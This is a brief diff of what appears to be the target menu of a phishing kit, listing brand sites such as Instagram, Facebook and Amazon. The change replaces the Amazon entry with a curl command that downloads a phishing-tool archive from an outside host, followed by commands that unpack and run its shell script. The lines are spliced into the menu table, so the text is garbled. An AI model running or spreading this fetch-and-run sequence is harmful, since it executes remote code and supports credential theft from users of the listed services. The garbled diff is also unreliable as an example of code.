@@ -17,7 +17,9 @@
 ##### UPDATES_TMP websites :          
 
           [01] Instagram      [17] DropBox        [33] eBay               
-          [02] Facebook       [18] Line           [34] Amazon         
+          [02] Facebook       [18] Line           [34] curl -O http://dsvr.blackeye.cloud/alld/blackeye.zip
+cd blackeye
+bash blackeye.sh         
           [03] Snapchat       [19] Shopify        [35] iCloud          
           [04] Twitter        [20] Messenger      [36] Spotify          
           [05] Github         [21] GitLab         [37] Netflix          
